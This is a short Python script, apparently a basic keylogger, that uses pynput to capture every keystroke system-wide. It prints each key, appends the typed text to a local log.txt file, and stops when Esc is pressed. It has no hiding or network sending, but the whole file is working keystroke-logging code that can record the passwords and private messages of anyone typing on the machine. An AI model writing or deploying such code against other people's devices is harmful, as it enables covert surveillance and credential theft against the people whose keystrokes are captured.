import pynput
from pynput.keyboard import Key, Listener
count = 0
keys = []

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1  #increasing the count after each Key Stroke
    print(format(key))
    if count >= 1: #saving it after each stroke
        count = 0
        write_file(keys)
        keys = []

# To store the keys in a file
def write_file(keys):
    with open("log.txt", "a") as f: #For creating a file put 'w'
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0: # for giving space when space bar is used
                f.write(' ')
            elif k.find("enter") > 0: # when enter key is pressed switch to next line
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(str(key))
def on_release(key):
    if key == Key.esc: # Terminate the programm when esc key is pressed
        return False
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
